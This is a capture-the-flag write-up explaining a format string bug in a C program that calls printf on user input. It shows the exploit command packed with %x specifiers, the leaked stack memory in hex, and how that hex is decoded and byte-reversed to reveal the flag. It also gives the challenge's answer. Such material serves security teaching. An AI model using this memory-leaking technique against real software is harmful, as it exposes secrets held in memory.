## Solution
- This is a *format string* vulnerability!
- The C function `printf` is extremely powerful. In particular, it is a variable length argument function.   
- Because of this, if the wrong number of parameters (for the amount of format strings specified) is put in, then the user can control the format string itself!  
- Using this vulnerability, an arbitrary write primitive or arbitrary read primitive is possible :)  
- This occurs  because of the code `printf(arg_buf);`. `arg_bufs` is interpretted as the format string itself, allowing for us to inject whatever we want into the interprettation.
- Using `%x` allows for us to leak memory from the stack (which is where the function  
parameters for the format string are put). 
    - Because we copied the *flag* string to the stack, this we can leak the flag!   

An example execution and output is shown below: 

```
./hello_world "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xx%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"

ffd463f264566483f3ffd456f41ffd46fdcffd456a4f7fcd89cffd4559b578ee33045f7b334353736968746565735f695f736d736f706d697373737d656c62a0078257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825158e8500ffd4561000
```

- Although this looks like a bunch of non-sense, if we change the hex to ascii (with something like https://www.rapidtables.com/convert/number/hex-to-ascii.html),   then it looks quite a bit better! 
```
ÿÔcòdVdóÿÔVôýFýÏýEjOÍÏýEYµxî3_{3CSsihtees_i_smsopmisss}elb WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWQXèPýEa
```

- The flag is `{3CSsihtees_i_smsopmisss}elb`. 
    - However, it looks garbled. This is because of memory on x86 is arranged in little endian format and is reversed for strings. 
    - When we are printing this via the `%x` specifier, we are printing out hex integers. Because the formating is unexpected, it's printed out wrong.   

- This means that the data is *reversed* from what is stored in memory in groups of 4. 
    - For instance, '{3CS' is the first part of the flag. 
    - We need to reverse each of the 4 bytes to get this nibble of bytes. This gives us 'SC3{', then 'this' and so on.  
    - At the end, the flag can be split up like so, then reversed: `{3CS siht ees_ i_sm sopm isss }elb` turns into `SC3{ this _see ms_i mpos sssi ble}`.   
- Finally, combine the entries to get `SC3{this_seems_impossssible}` for the flag. 
- SC3{this_seems_impossssible}
